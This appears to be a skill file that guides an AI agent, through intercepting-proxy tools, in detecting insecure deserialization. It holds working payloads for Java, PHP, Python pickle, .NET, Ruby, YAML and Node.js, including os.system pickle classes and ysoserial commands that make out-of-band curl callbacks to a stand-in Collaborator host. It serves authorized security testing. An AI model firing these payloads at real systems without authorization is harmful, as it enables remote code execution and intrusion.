# Insecure Deserialization Detection Skill

## Objective
Identify insecure deserialization vulnerabilities where untrusted data is deserialized without proper validation, potentially leading to RCE.

## Instructions

### 1. Identify Deserialization Points
Look for serialized data in:
- Cookies (base64 encoded objects)
- Session tokens
- API parameters
- Hidden form fields
- File uploads
- Message queues
- Cache mechanisms

### 2. Recognize Serialization Formats

**Java (serialized object):**
```
Magic bytes: AC ED 00 05
Base64: rO0AB...
```

**PHP (serialized):**
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

**Python (pickle):**
```
Base64: gAN...
Magic bytes: \x80\x03 or \x80\x04
```

**.NET (ViewState):**
```
Base64 starting with: /wE...
AAEAAAD/////...
```

**YAML:**
```yaml
!!python/object:__main__.User
name: admin
```

**Ruby (Marshal):**
```
Base64: BAh...
Magic bytes: \x04\x08
```

### 3. Java Deserialization

**Detect Java serialization:**
- Magic bytes: `AC ED 00 05` or `rO0AB` (base64)
- Common locations: cookies, ViewState, custom headers

**Test with ysoserial gadgets:**
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "curl COLLABORATOR" | base64

# Common gadget chains
CommonsCollections1-7
CommonsBeanutils1
Spring1-4
Hibernate1-2
JRMPClient
Jdk7u21
```

**Use Collaborator for OOB:**
```bash
java -jar ysoserial.jar URLDNS "http://COLLABORATOR" | base64
```

### 4. PHP Deserialization

**Basic PHP object injection:**
```php
O:8:"stdClass":1:{s:4:"test";s:4:"test";}
```

**Magic methods to target:**
```
__construct()
__destruct()
__wakeup()
__sleep()
__toString()
__call()
__get()
__set()
```

**POP chain example:**
```php
O:4:"Evil":1:{s:4:"file";s:11:"/etc/passwd";}
```

**Phar deserialization:**
Upload phar file, trigger via `phar://` wrapper:
```
phar://uploads/evil.phar/test.txt
```

### 5. Python Pickle

**Basic pickle payload:**
```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('curl COLLABORATOR',))

payload = pickle.dumps(Evil())
```

**Common indicators:**
- `pickle.loads()` with user input
- `yaml.load()` without `Loader=SafeLoader`
- `jsonpickle.decode()`

**Pickle payload generation:**
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

### 6. .NET Deserialization

**ViewState analysis:**
1. Check if ViewState is encrypted/MAC protected
2. If not, decode and modify

**BinaryFormatter payloads:**
Use ysoserial.net:
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "ping COLLABORATOR"
```

**ObjectStateFormatter:**
```bash
ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -c "calc"
```

**Common gadgets:**
```
TypeConfuseDelegate
TextFormattingRunProperties
PSObject
ActivitySurrogateSelector
```

### 7. Ruby Marshal

**Basic payload:**
```ruby
Marshal.dump(Object.new)
```

**ERB template injection via Marshal:**
```ruby
require 'erb'
erb = ERB.new("<%= system('id') %>")
Marshal.dump(erb)
```

### 8. YAML Deserialization

**Python YAML (PyYAML):**
```yaml
!!python/object/apply:os.system ['curl COLLABORATOR']
```

**Ruby YAML:**
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

### 9. Node.js Deserialization

**node-serialize:**
```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl COLLABORATOR')}()"}
```

**serialize-to-js:**
```javascript
var y = {
    rce : function(){
        require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('serialize-to-js');
console.log(serialize(y));
```

### 10. Detection via Timing/OOB

**DNS callback payload:**
Generate with `collaborator_generate`, use in:
- URLDNS gadget (Java)
- curl/wget commands in RCE payloads

**Time-based detection:**
- Sleep commands in payloads
- CPU-intensive operations

### 11. Blind Deserialization Detection

When no direct output:
1. Use DNS callbacks via Collaborator
2. Use time-based payloads
3. Monitor for server errors
4. Check for specific error messages

### 12. Confirm and Document
If confirmed, create finding with:
- Vulnerable endpoint/parameter
- Serialization format
- Working gadget chain
- Evidence (Collaborator callback, command output)
- Impact assessment (RCE, DoS)

## MCP Tools to Use
- `http1_request` / `http2_request`: Send payloads
- `base64_encode` / `base64_decode`: Encode/decode payloads
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## Keywords
deserialisation, insecure deserialization, object injection

## References
- PayloadsAllTheThings/Insecure Deserialization
- ysoserial (Java) / ysoserial.net (.NET)
- OWASP Deserialization Cheat Sheet
